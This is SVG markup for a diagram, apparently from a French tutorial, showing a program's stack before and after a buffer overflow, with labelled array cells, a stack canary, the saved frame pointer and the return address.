<path d='M 328,272 L 328,288' fill='none' stroke='currentColor'></path>
<path d='M 328,592 L 328,608' fill='none' stroke='currentColor'></path>
<path d='M 352,64 L 352,96' fill='none' stroke='currentColor'></path>
<path d='M 352,144 L 352,176' fill='none' stroke='currentColor'></path>
<path d='M 352,384 L 352,416' fill='none' stroke='currentColor'></path>
<path d='M 352,464 L 352,496' fill='none' stroke='currentColor'></path>
<path d='M 368,224 L 368,256' fill='none' stroke='currentColor'></path>
<path d='M 368,544 L 368,576' fill='none' stroke='currentColor'></path>
<path d='M 384,64 L 384,96' fill='none' stroke='currentColor'></path>
<path d='M 384,144 L 384,176' fill='none' stroke='currentColor'></path>
<path d='M 384,384 L 384,416' fill='none' stroke='currentColor'></path>
<path d='M 384,464 L 384,496' fill='none' stroke='currentColor'></path>
<path d='M 416,64 L 416,96' fill='none' stroke='currentColor'></path>
<path d='M 416,144 L 416,176' fill='none' stroke='currentColor'></path>
<path d='M 416,384 L 416,416' fill='none' stroke='currentColor'></path>
<path d='M 416,464 L 416,496' fill='none' stroke='currentColor'></path>
<path d='M 432,560 L 432,576' fill='none' stroke='currentColor'></path>
<path d='M 432,576 L 432,608' fill='none' stroke='currentColor'></path>
<path d='M 448,64 L 448,96' fill='none' stroke='currentColor'></path>
<path d='M 448,144 L 448,176' fill='none' stroke='currentColor'></path>
<path d='M 448,384 L 448,416' fill='none' stroke='currentColor'></path>
<path d='M 448,464 L 448,496' fill='none' stroke='currentColor'></path>
<path d='M 480,64 L 480,96' fill='none' stroke='currentColor'></path>
<path d='M 480,144 L 480,176' fill='none' stroke='currentColor'></path>
<path d='M 480,384 L 480,416' fill='none' stroke='currentColor'></path>
<path d='M 480,464 L 480,496' fill='none' stroke='currentColor'></path>
<path d='M 512,64 L 512,96' fill='none' stroke='currentColor'></path>
<path d='M 512,144 L 512,176' fill='none' stroke='currentColor'></path>
<path d='M 512,384 L 512,416' fill='none' stroke='currentColor'></path>
<path d='M 512,464 L 512,496' fill='none' stroke='currentColor'></path>
<path d='M 72,264 L 72,272' fill='none' stroke='currentColor'></path>
<polygon points='88.000000,272.000000 76.000000,266.399994 76.000000,277.600006' fill='currentColor' transform='rotate(270.000000, 72.000000, 272.000000)'></polygon>
<path d='M 72,584 L 72,592' fill='none' stroke='currentColor'></path>
<polygon points='88.000000,592.000000 76.000000,586.400024 76.000000,597.599976' fill='currentColor' transform='rotate(270.000000, 72.000000, 592.000000)'></polygon>
<path d='M 224,264 L 224,272' fill='none' stroke='currentColor'></path>
<polygon points='240.000000,272.000000 228.000000,266.399994 228.000000,277.600006' fill='currentColor' transform='rotate(270.000000, 224.000000, 272.000000)'></polygon>
<path d='M 224,584 L 224,592' fill='none' stroke='currentColor'></path>
<polygon points='240.000000,592.000000 228.000000,586.400024 228.000000,597.599976' fill='currentColor' transform='rotate(270.000000, 224.000000, 592.000000)'></polygon>
<path d='M 328,264 L 328,272' fill='none' stroke='currentColor'></path>
<polygon points='344.000000,272.000000 332.000000,266.399994 332.000000,277.600006' fill='currentColor' transform='rotate(270.000000, 328.000000, 272.000000)'></polygon>
<path d='M 328,584 L 328,592' fill='none' stroke='currentColor'></path>
<polygon points='344.000000,592.000000 332.000000,586.400024 332.000000,597.599976' fill='currentColor' transform='rotate(270.000000, 328.000000, 592.000000)'></polygon>
<polygon points='472.000000,576.000000 460.000000,570.400024 460.000000,581.599976' fill='currentColor' transform='rotate(0.000000, 464.000000, 576.000000)'></polygon>
<polygon points='536.000000,80.000000 524.000000,74.400002 524.000000,85.599998' fill='currentColor' transform='rotate(180.000000, 528.000000, 80.000000)'></polygon>
<polygon points='536.000000,160.000000 524.000000,154.399994 524.000000,165.600006' fill='currentColor' transform='rotate(180.000000, 528.000000, 160.000000)'></polygon>
<polygon points='536.000000,400.000000 524.000000,394.399994 524.000000,405.600006' fill='currentColor' transform='rotate(180.000000, 528.000000, 400.000000)'></polygon>
<polygon points='536.000000,480.000000 524.000000,474.399994 524.000000,485.600006' fill='currentColor' transform='rotate(180.000000, 528.000000, 480.000000)'></polygon>
<path d='M 416,544 A 16,16 0 0,1 432,560' fill='none' stroke='currentColor'></path>
<path d='M 432,608 A 16,16 0 0,1 416,624' fill='none' stroke='currentColor'></path>
<text text-anchor='middle' x='0' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='0' y='596' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='8' y='196' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='8' y='276' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='8' y='516' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='8' y='596' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='16' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='116' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='196' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='16' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='276' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='16' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='16' y='436' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='16' y='516' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='16' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='16' y='596' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='24' y='244' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='24' y='564' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='32' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='32' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='40' y='244' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='40' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='244' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='48' y='308' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='48' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='48' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='48' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='48' y='628' fill='currentColor' style='font-size:1em'>C</text>
<text text-anchor='middle' x='56' y='244' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='56' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='56' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='56' y='628' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='64' y='244' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='64' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='64' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='64' y='628' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='72' y='244' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='72' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='72' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='72' y='628' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='80' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='80' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='80' y='244' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='80' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='80' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='80' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='80' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='80' y='628' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='88' y='244' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='88' y='308' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='88' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='88' y='628' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='96' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='96' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='104' y='244' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='104' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='112' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='112' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='112' y='244' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='112' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='112' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='112' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='120' y='244' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='120' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='128' y='244' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='128' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='136' y='244' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='136' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='144' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='144' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='144' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='596' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='152' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='152' y='564' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='152' y='596' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='160' y='596' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='168' y='356' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='176' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='176' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='176' y='596' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='184' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='184' y='596' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='244' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='192' y='276' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='192' y='308' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='192' y='564' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='192' y='596' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='192' y='628' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='200' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='200' y='564' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='200' y='628' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='308' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='208' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='208' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='208' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='628' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='216' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='356' fill='currentColor' style='font-size:1em'>√®</text>
<text text-anchor='middle' x='216' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='628' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='224' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='628' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='244' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='232' y='564' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='308' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='240' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='240' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='628' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>'</text>
<text text-anchor='middle' x='248' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='308' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='356' fill='currentColor' style='font-size:1em'>'</text>
<text text-anchor='middle' x='248' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='628' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='256' y='244' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='256' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='256' y='564' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='264' y='36' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='264' y='244' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='264' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='264' y='356' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='264' y='564' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='264' y='596' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='272' y='36' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='272' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='272' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='272' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='272' y='276' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='272' y='356' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='272' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='272' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='272' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='272' y='596' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='280' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='280' y='276' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='280' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='280' y='596' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='288' y='36' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='288' y='356' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='296' y='36' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='296' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='296' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='296' y='596' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='304' y='36' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='304' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='304' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='304' y='244' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='304' y='276' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='304' y='308' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='304' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='304' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='304' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='304' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='304' y='596' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='304' y='628' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='312' y='36' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='312' y='244' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='312' y='276' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='312' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='312' y='356' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='312' y='564' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='312' y='596' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='312' y='628' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='320' y='244' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='320' y='308' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='320' y='564' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='320' y='628' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='328' y='244' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='328' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='328' y='564' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='328' y='628' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='336' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='336' y='244' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='308' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='336' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='336' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='336' y='564' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='628' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='344' y='244' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='344' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='344' y='564' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='344' y='596' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='352' y='244' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='352' y='276' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='352' y='308' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='352' y='564' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='352' y='596' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='352' y='628' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='360' y='276' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='360' y='308' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='360' y='596' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='360' y='628' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='368' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='368' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='368' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='368' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='400' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='400' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='400' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='400' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='432' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='432' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='432' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='432' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='464' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='464' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='464' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='464' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='480' y='580' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='488' y='196' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='488' y='516' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='488' y='580' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='496' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='496' y='196' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='496' y='404' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='496' y='484' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='496' y='516' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='504' y='196' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='504' y='516' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='504' y='580' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='512' y='116' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='512' y='436' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='512' y='580' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='520' y='116' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='520' y='436' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='520' y='580' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='528' y='580' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='536' y='580' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='544' y='580' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='560' y='84' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='560' y='164' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='560' y='404' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='560' y='484' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='560' y='580' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='568' y='84' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='568' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='568' y='404' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='568' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='568' y='580' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='576' y='84' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='576' y='164' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='576' y='404' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='576' y='484' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='576' y='580' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='584' y='84' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='584' y='164' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='584' y='404' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='584' y='484' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='592' y='84' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='592' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='592' y='404' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='592' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='592' y='580' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='600' y='84' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='600' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='600' y='404' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='600' y='484' fill='currentColor' style='font-size:1em'>a</text>
